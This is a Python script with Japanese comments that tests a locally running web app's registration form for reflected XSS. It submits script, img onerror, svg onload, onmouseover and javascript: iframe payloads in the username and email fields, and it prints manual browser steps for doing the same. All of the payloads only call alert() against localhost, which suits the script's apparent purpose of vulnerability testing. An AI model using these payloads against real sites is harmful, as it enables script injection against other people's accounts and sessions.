#!/usr/bin/env python3
"""
新規登録でエラーを発生させてXSSを確認するスクリプト
"""

import requests
import time

def create_duplicate_user_xss():
    print("=== 重複ユーザー名エラーでXSS発火テスト ===\n")
    
    base_url = "http://localhost:8000"
    session = requests.Session()
    
    # 手順1: まず普通のユーザーを作成
    print("1. 🟢 通常ユーザーを先に登録...")
    normal_response = session.post(f"{base_url}/register", data={
        'username': 'testuser',
        'email': 'test@example.com',
        'password': 'password123'
    })
    
    if normal_response.status_code == 200:
        if "ユーザー登録が完了しました" in normal_response.text:
            print("✅ 通常ユーザー 'testuser' の登録成功")
        elif "既に使用されています" in normal_response.text:
            print("ℹ️  ユーザー 'testuser' は既に存在します")
    
    time.sleep(1)
    
    # 手順2: 同じユーザー名でXSSペイロードを含む登録を試行
    print("\n2. 🚨 XSSペイロード付きで重複登録を試行...")
    
    xss_payloads = [
        "testuser<script>alert('重複エラーXSS成功!')</script>",
        "testuser<img src=x onerror=alert('IMG XSS!')>",
        "testuser<svg onload=alert('SVG XSS!')>",
    ]
    
    for i, xss_username in enumerate(xss_payloads, 1):
        print(f"\nテスト {i}: {xss_username}")
        
        xss_response = session.post(f"{base_url}/register", data={
            'username': xss_username,
            'email': f'xss{i}@example.com',
            'password': 'password123'
        })
        
        if xss_response.status_code == 200:
            # レスポンス内容をチェック
            response_text = xss_response.text
            
            if "<script>" in response_text and "alert" in response_text:
                print("🚨 XSS脆弱性確認！スクリプトタグがエスケープされていません")
                
                # XSSが含まれる行を表示
                lines = response_text.split('\n')
                for line_num, line in enumerate(lines, 1):
                    if "<script>" in line or "onerror=" in line or "onload=" in line:
                        print(f"  🎯 Line {line_num}: {line.strip()}")
                
            elif "このユーザー名は既に使用されています" in response_text:
                print("❌ エラーメッセージは表示されましたが、XSSはエスケープされています")
            else:
                print("⚠️  予期しないレスポンスです")
        
        time.sleep(0.5)

def create_invalid_email_xss():
    print("\n=== 無効メールアドレスエラーでXSS発火テスト ===\n")
    
    base_url = "http://localhost:8000"
    session = requests.Session()
    
    # 無効なメールアドレスでXSSペイロード
    xss_emails = [
        "invalid-email<script>alert('Email XSS!')</script>",
        "test@<img src=x onerror=alert('Email IMG XSS!')>",
        "malicious<svg onload=alert('Email SVG XSS!')>@test.com"
    ]
    
    for i, xss_email in enumerate(xss_emails, 1):
        print(f"テスト {i}: メールアドレス = {xss_email}")
        
        response = session.post(f"{base_url}/register", data={
            'username': f'emailtest{i}',
            'email': xss_email,
            'password': 'password123'
        })
        
        if "<script>" in response.text or "onerror=" in response.text or "onload=" in response.text:
            print("🚨 メールアドレスでXSS脆弱性確認！")
        else:
            print("❌ メールアドレスXSSは発火しませんでした")

def test_database_error_xss():
    print("\n=== データベースエラーでXSS発火テスト ===\n")
    
    base_url = "http://localhost:8000"
    session = requests.Session()
    
    # 非常に長いユーザー名でデータベースエラーを誘発
    very_long_username = "a" * 1000 + "<script>alert('DB Error XSS!')</script>"
    
    print(f"非常に長いユーザー名でテスト（{len(very_long_username)}文字）...")
    
    response = session.post(f"{base_url}/register", data={
        'username': very_long_username,
        'email': 'dbtest@example.com',
        'password': 'password123'
    })
    
    if "<script>" in response.text:
        print("🚨 データベースエラーでXSS発火確認！")
    else:
        print("❌ データベースエラーXSSは発火しませんでした")

def manual_test_instructions():
    print("\n" + "="*60)
    print("🔧 手動テスト手順（ブラウザで実行）")
    print("="*60)
    
    print("\n📋 手順1: 通常ユーザー作成")
    print("1. http://localhost:8000/register にアクセス")
    print("2. 以下で登録:")
    print("   ユーザー名: normaluser")
    print("   メール: normal@test.com")
    print("   パスワード: password123")
    print("3. 「登録」ボタンをクリック")
    
    print("\n📋 手順2: XSSペイロード付き重複登録")
    print("1. 再度 http://localhost:8000/register にアクセス")
    print("2. 以下で登録:")
    print("   ユーザー名: normaluser<script>alert('XSS成功!')</script>")
    print("   メール: xss@test.com")
    print("   パスワード: password123")
    print("3. 「登録」ボタンをクリック")
    print("4. エラーメッセージでアラートが表示されればXSS成功！")
    
    print("\n🎯 期待される結果:")
    print("- 「このユーザー名は既に使用されています」エラーメッセージ")
    print("- 同時にJavaScriptアラート 'XSS成功!' が表示")
    print("- ページ上にスクリプトタグが直接表示される")
    
    print("\n💡 他のXSSペイロード例:")
    xss_examples = [
        "<img src=x onerror=alert('IMG XSS!')>",
        "<svg onload=alert('SVG XSS!')>",
        "<div onmouseover=alert('DIV XSS!')>マウスオーバー</div>",
        "<iframe src='javascript:alert(\"IFRAME XSS\")'></iframe>"
    ]
    
    for i, payload in enumerate(xss_examples, 1):
        print(f"{i}. normaluser{payload}")

if __name__ == "__main__":
    try:
        create_duplicate_user_xss()
        create_invalid_email_xss()
        test_database_error_xss()
        manual_test_instructions()
        
    except requests.exceptions.ConnectionError:
        print("❌ サーバーに接続できません")
        print("📋 手動テスト手順を表示します：")
        manual_test_instructions()
        
        print("\n🚀 サーバー起動方法:")
        print("1. 新しいターミナルで: py run.py")
        print("2. http://localhost:8000 でアクセス可能になります")
    
    except Exception as e:
        print(f"⚠️  エラーが発生しました: {e}")
        manual_test_instructions()